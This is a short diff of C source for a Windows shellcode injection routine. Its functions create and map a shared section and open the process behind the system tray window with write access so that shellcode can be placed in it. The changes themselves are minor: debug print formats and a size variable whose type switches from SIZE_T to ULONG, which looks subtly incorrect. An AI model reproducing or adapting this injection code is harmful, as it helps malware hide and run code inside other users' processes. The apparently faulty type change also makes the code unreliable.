@@ -18,10 +18,9 @@ PVOID map_code_and_addresses_into_process(HANDLE hProcess, LPBYTE shellcode, SIZ
         printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
         return NULL;
     }
-    printf("Section handle: %x\n", hSection);
 
     PVOID sectionBaseAddress = NULL;
-    SIZE_T viewSize = 0;
+    ULONG viewSize = 0;
     SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE
 
     // map the section in context of current process:
@@ -73,10 +72,10 @@ bool inject_into_tray(LPBYTE shellcode, SIZE_T shellcodeSize)
 
     DWORD pid = 0;
     GetWindowThreadProcessId(hWnd, &pid);
-    printf("PID:\t%p\n", pid);
+    printf("PID:\t%d\n", pid);
    //save the current value, because we will need to recover it:
     LONG winLong = GetWindowLongW(hWnd, 0);
-    printf("WindowLong:\t%p\n", winLong);
+    printf("WindowLong:\t%lx\n", winLong);
 
     HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid);
     if (hProcess == NULL) {
